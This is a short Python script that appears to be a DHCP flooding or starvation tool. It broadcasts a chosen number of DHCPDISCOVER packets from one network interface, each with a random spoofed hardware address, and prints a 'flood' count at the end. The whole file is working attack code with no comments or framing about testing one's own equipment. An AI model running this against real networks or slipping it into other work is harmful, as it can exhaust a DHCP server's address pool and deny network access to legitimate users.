#!/usr/bin/env python3
"""Send N DHCPDISCOVERs with random hardware addresses out of one interface."""
import os, socket, struct, sys
iface, count = sys.argv[1], int(sys.argv[2])
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.setsockopt(socket.SOL_SOCKET, socket.SO_BINDTODEVICE, iface.encode())
s.bind(("0.0.0.0", 68))
sent = 0
for i in range(count):
    mac = b"\x02" + os.urandom(5)
    pkt = struct.pack("!BBBBIHH4s4s4s4s16s64s128sI", 1, 1, 6, 0, i, 0, 0x8000,
                      b"\0"*4, b"\0"*4, b"\0"*4, b"\0"*4, mac, b"", b"", 0x63825363)
    pkt += bytes([53, 1, 1, 55, 3, 1, 3, 6, 255])
    try:
        s.sendto(pkt, ("255.255.255.255", 67)); sent += 1
    except OSError:
        pass
print(f"flood: sent {sent} of {count} DISCOVERs")
